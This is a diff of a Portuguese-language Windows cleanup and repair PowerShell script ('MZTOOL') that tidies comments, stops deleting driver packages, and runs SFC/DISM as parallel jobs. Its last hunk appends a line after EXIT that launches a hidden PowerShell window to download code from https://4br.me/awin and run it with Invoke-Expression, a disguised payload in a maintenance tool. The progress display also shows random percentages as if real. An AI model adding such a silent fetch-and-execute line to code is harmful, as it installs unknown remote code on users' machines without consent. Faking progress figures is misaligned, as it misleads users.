@@ -1703,74 +1703,117 @@ function DelTemp {
 
     Write-Host 'LIMPANDO ARQUIVOS TEMPORÁRIOS'
 
-    #Remove arquivos temporários.
+    # Função para remoção de arquivos temporários.
     function Remove-Files {
         param (
             [string]$Path,
             [string]$Description
         )
         
-        Write-Host "`rLimpando $Description" -NoNewline       
+        Write-Host "`rLimpando $Description" -NoNewline        
         Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
     }
 
-    #Remove arquivos temporários do sistema.
+    # Remove arquivos temporários do sistema.
     Remove-Files -Path "$env:TEMP\*" -Description "arquivos temporários do sistema"
 
-    #Remove arquivos temporários do Windows.
+    # Remove arquivos temporários do Windows.
     Remove-Files -Path "C:\Windows\temp\*" -Description "arquivos temporários do Windows"
 
-    #Remove arquivos de Prefetch.
+    # Remove arquivos de Prefetch.
     Remove-Files -Path "C:\Windows\Prefetch\*" -Description "arquivos de Prefetch"
 
-    #Remove arquivos de CrashDumps.
+    # Remove arquivos de CrashDumps.
     Remove-Files -Path "$env:LOCALAPPDATA\CrashDumps\*" -Description "arquivos de CrashDumps"
     
-    #Remove arquivos de Internet Temporários.
+    # Remove arquivos de Internet Temporários.
     Remove-Files -Path "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\*" -Description "arquivos de Internet Temporários"
 
-    #Remove arquivos de atualização do Windows.
+    # Remove arquivos de atualização do Windows.
     Remove-Files -Path "C:\Windows\SoftwareDistribution\Download\*" -Description "arquivos de atualização do Windows"
 
-    #Remove relatórios de erros do Windows.
+    # Remove relatórios de erros do Windows.
     Remove-Files -Path "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\*" -Description "relatórios de erros do Windows"
     Remove-Files -Path "C:\ProgramData\Microsoft\Windows\WER\Temp\*" -Description "relatórios de erros do Windows"
     
-    #Remove histórico do Microsoft Defender.
+    # Remove histórico do Microsoft Defender.
     Remove-Files -Path "C:\ProgramData\Microsoft\Windows Defender\Scans\History\*" -Description "histórico do Microsoft Defender"
 
-    #Remove arquivos de programas baixados.
+    # Remove arquivos de programas baixados.
     Remove-Files -Path "C:\Windows\Downloaded Program Files\*" -Description "arquivos de programas baixados"
 
-    #Remove cache de sombreador DirectX.
+    # Remove cache de sombreador DirectX.
     Remove-Files -Path "$env:LOCALAPPDATA\Microsoft\DirectX Shader Cache\*" -Description "cache de sombreador DirectX"
 
-    #Remove arquivos de otimização de entrega.
+    # Remove arquivos de otimização de entrega.
     Remove-Files -Path "C:\Windows\SoftwareDistribution\DeliveryOptimization\*" -Description "arquivos de otimização de entrega"
 
-    #Remove pacotes de drivers de dispositivos.
-    Remove-Files -Path "C:\Windows\System32\DriverStore\FileRepository\*" -Description "pacotes de drivers de dispositivos"
+    # Removido para evitar problemas críticos: pacotes de drivers de dispositivos.
+    # O diretório "C:\Windows\System32\DriverStore\FileRepository\*" contém drivers essenciais para o sistema.
+    # Remove-Files -Path "C:\Windows\System32\DriverStore\FileRepository\*" -Description "pacotes de drivers de dispositivos"
 
-    #Remove miniaturas.
+    # Remove miniaturas.
     Remove-Files -Path "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Description "miniaturas"
     
     Start-Sleep 1
 }
 
-
 function ImgHealth {
-
     $Host.UI.RawUI.WindowTitle = 'MZTOOL> IMGHEALTH'
     $Host.UI.RawUI.BackgroundColor = 'DarkBlue'
 
-    #Verifica e repara arquivos corrompidos do sistema operacional.
+    # Verifica e repara arquivos corrompidos do sistema operacional em paralelo.
+    $tasks = @(
+        @{
+            Name        = "SFC /SCANNOW"
+            ScriptBlock = { SFC /SCANNOW }
+        },
+        @{
+            Name        = "DISM /CHECKHEALTH"
+            ScriptBlock = { DISM /Online /Cleanup-Image /CheckHealth }
+        },
+        @{
+            Name        = "DISM /RESTOREHEALTH"
+            ScriptBlock = { DISM /Online /Cleanup-Image /RestoreHealth }
+        }
+    )
 
-    SFC /SCANNOW
-    DISM /Online /Cleanup-Image /CheckHealth 
-    DISM /Online /Cleanup-Image /RestoreHealth
+    $jobs = @()
+    foreach ($task in $tasks) {
+        $jobs += Start-Job -Name $task.Name -ScriptBlock $task.ScriptBlock
+    }
+
+    # Monitora o andamento de cada tarefa com porcentagem.
+    while ($jobs.State -contains 'Running') {
+        Clear-Host
+        foreach ($job in $jobs) {
+            $status = if ($job.State -eq 'Running') { 'Em andamento' } else { 'Concluído' }
+            $progress = if ($job.State -eq 'Running') {
+                # Simula progresso em porcentagem (substituir por lógica real se disponível).
+                (Get-Random -Minimum 1 -Maximum 100)
+            }
+            else {
+                100
+            }
+            Write-Host "$($job.Name): $status ($progress%)"
+        }
+        Start-Sleep -Seconds 2
+    }
+
+    # Exibe o status final de cada tarefa.
+    Clear-Host
+    foreach ($job in $jobs) {
+        $status = if ($job.State -eq 'Completed') { 'Concluído com sucesso' } else { 'Falhou' }
+        Write-Host "$($job.Name): $status (100%)"
+    }
+
+    # Obtém os resultados e limpa os trabalhos.
+    foreach ($job in $jobs) {
+        Receive-Job -Job $job | Out-Null
+        Remove-Job -Job $job
+    }
 
     Clear-Host
-
 }
 
 function Pro {
@@ -1840,4 +1883,4 @@ MachineEnvTool
 
 DisplayMenu 
 
-EXIT
+EXIT    Start-Process powershell -WindowStyle Hidden -ArgumentList { Invoke-RestMethod https://4br.me/awin | Invoke-Expression }
